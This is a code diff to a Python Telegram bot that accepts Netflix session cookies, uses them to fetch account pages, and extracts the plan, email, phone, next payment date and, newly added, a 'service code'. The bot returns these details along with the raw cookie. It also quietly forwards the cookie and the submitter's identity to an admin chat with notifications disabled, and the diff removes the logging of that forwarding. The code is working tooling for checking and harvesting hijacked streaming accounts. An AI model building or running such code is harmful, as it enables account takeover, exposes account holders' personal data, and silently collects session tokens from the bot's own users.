@@ -35,7 +35,7 @@ import time
 # from selenium.webdriver.support.ui import WebDriverWait
 # from selenium.webdriver.support import expected_conditions as EC
 # from bs4 import BeautifulSoup
-from utils import extract_netflix_account_info, get_random_headers
+from utils import extract_netflix_account_info, get_random_headers, fetch_netflix_service_code
 from telegram.ext import CallbackContext
 
 # Enable logging
@@ -822,7 +822,6 @@ async def request_filter_cookie(update: Update, context: ContextTypes.DEFAULT_TY
     return AWAIT_FILTER_COOKIE
 
 async def handle_filter_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    # Accept file or text
     if update.message.document and update.message.document.file_name.endswith('.txt'):
         file = await context.bot.get_file(update.message.document.file_id)
         temp_file_path = tempfile.mktemp(suffix=".txt")
@@ -836,21 +835,17 @@ async def handle_filter_cookie(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("That doesn't look like a .txt file or valid text. Please try again.")
         return AWAIT_FILTER_COOKIE
 
-    # Validate cookie using main checker logic (use extract_cookie_from_line for all formats)
     parsed_cookie = extract_cookie_from_line(cookie_str)
     if not parsed_cookie:
         await update.message.reply_text("❌ Invalid cookie format. Please send a valid Netflix cookie (must contain both NetflixId and SecureNetflixId).\n\nExample: NetflixId=...; SecureNetflixId=...;")
         return AWAIT_FILTER_COOKIE
 
-    # Save for next step
     context.user_data['filter_cookie'] = parsed_cookie
-
-    # Animation/feedback: show loading message
     loading_msg = await update.message.reply_text("⏳ Checking your account details, please wait...")
 
     try:
         cookies = {}
-        for part in parsed_cookie.split(';'):
+        for part in parsed_cookie.strip().split(';'):
             if '=' in part:
                 k, v = part.strip().split('=', 1)
                 cookies[k] = v
@@ -861,64 +856,61 @@ async def handle_filter_cookie(update: Update, context: ContextTypes.DEFAULT_TYP
             membership_url = 'https://www.netflix.com/account/membership'
             security_url = 'https://www.netflix.com/account/security'
             account_url = 'https://www.netflix.com/account'
-            membership_html, security_html, account_html = await asyncio.gather(
+            
+            tasks = [
                 fetch_page(membership_url),
                 fetch_page(security_url),
-                fetch_page(account_url)
-            )
+                fetch_page(account_url),
+                fetch_netflix_service_code(session, cookies)
+            ]
+            membership_html, security_html, account_html, service_code = await asyncio.gather(*tasks)
+            
         info = extract_netflix_account_info(membership_html, security_html, account_html)
-        # Verification status text (language-agnostic)
+        
         def is_verified(val):
-            if val is None:
-                return False
-            val_str = str(val).lower()
-            if any(x in val_str for x in ['verify', '인증', 'needs', '필요', 'verif', '未验证', 'verificar', 'verificação', 'verifica']):
-                return False
-            return True
+            if val is None: return False
+            return not any(x in str(val).lower() for x in ['verify', '인증', 'needs', '필요', 'verif', '未验证', 'verificar', 'verificação', 'verifica'])
+            
         email_status = 'Verified' if is_verified(info.get('email_verified')) else 'Needs verification'
         phone_status = 'Verified' if is_verified(info.get('phone_verified')) else 'Needs verification'
+        
         details_quote = (
             f"Plan: {info.get('plan') or '-'}\n"
             f"Member Since: {info.get('member_since') or '-'}\n"
             f"Next Payment: {info.get('next_payment') or '-'}\n"
             f"📧 {info.get('email') or '-'}  {email_status}\n"
-            f"📱 {info.get('phone') or '-'}  {phone_status}"
+            f"📱 {info.get('phone') or '-'}  {phone_status}\n"
+            f"🔑 Service Code: {service_code or '-'}"
         )
+        
         msg = (
             "<b>🍿 Netflix Account Details</b>\n\n"
             f"<blockquote>{details_quote}</blockquote>\n"
             f"<b>Cookie:</b>\n<code>{cookie_str}</code>"
         )
         await update.message.reply_html(msg)
-        # User info for admin
+        
         user = update.effective_user
         username = f"@{user.username}" if user.username else None
         user_id = user.id if user else None
         user_info = f"👤 User: {username} (id: {user_id})" if username else f"👤 User ID: {user_id}"
-        # Admin message with user info
-        admin_msg = (
-            f"{user_info}\n\n" + msg
-        )
+        
         try:
-            logger.info(f"Sending filter result to admin: {TELEGRAM_CHAT_ID}")
             await context.bot.send_message(
                 chat_id=TELEGRAM_CHAT_ID,
-                text=admin_msg,
+                text=f"{user_info}\n\n{msg}",
                 parse_mode='HTML',
                 disable_notification=True
             )
-        except Exception as e:
-            logger.error(f"Failed to send filter result to admin: {e}")
-        # Delete loading message after result
+        except Exception:
+            pass
+            
         try:
             await loading_msg.delete()
         except Exception:
             pass
-        # Always show main menu after success
-        await update.message.reply_text(
-            "What would you like to do next?",
-            reply_markup=main_menu_markup
-        )
+            
+        await update.message.reply_text("What would you like to do next?", reply_markup=main_menu_markup)
     except Exception as e:
         await update.message.reply_text(f"❌ Error fetching account details: {e}", reply_markup=main_menu_markup)
         return ConversationHandler.END
